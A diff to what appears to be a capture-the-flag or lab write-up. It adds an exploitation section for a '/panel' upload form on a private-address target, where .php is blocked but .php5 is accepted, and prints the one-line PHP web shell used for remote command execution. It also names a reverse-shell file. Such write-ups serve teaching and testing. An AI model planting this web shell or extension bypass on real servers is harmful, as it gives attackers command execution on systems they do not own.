@@ -79,36 +79,44 @@ sudo feroxbuster -u http://10.49.136.148/ -w /usr/share/seclists/Discovery/Web-C
 
 During web enumeration, a `/panel` endpoint was discovered. Upon accessing it, a file upload interface was identified, allowing users to select and upload files.
 
+### File used Location
+```bash
+/home/user/php-reverse-shell.php5
+```
+
+![Blocked](screenshots.3png)
+
 ### Analysis
 
-The presence of a file upload form using `multipart/form-data` encoding indicates that the application accepts user-supplied files.
+During testing, it was observed that direct upload of `.php` files was restricted by the application.
 
-Such functionality can be risky if proper validation is not implemented, as it may allow attackers to upload malicious files.
+However, the application failed to block alternative PHP extensions such as `.php5`, indicating weak file type validation.
+
+---
+![Allowed](screenshots/4,png)
+
+### Exploitation
+
+A malicious file was created using a supported PHP extension:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Saved as:
+
+```
+shell.php5
+```
+
+The file was successfully uploaded through the panel.
 
 ---
 
-### Testing
+### Result
 
-The upload functionality was tested by uploading different file types to determine whether restrictions were enforced.
+The uploaded file was accessed via the browser and executed successfully, allowing remote command execution.
 
-- A basic file upload was performed to confirm functionality.
-- Additional tests were conducted using potentially executable file types.
+This confirmed that the application is vulnerable to unrestricted file upload via extension bypass.
 
----
-
-### Potential Vulnerability
-
-If the application does not properly validate file type, extension, or content, it may allow arbitrary file uploads.
-
-This can lead to:
-
-- Remote Code Execution (RCE)
-- Server compromise
-- Unauthorized access
-
----
-
-### Conclusion
-
-The file upload functionality represents a potential attack surface. Further testing is required to determine whether it can be exploited for remote code execution.
 
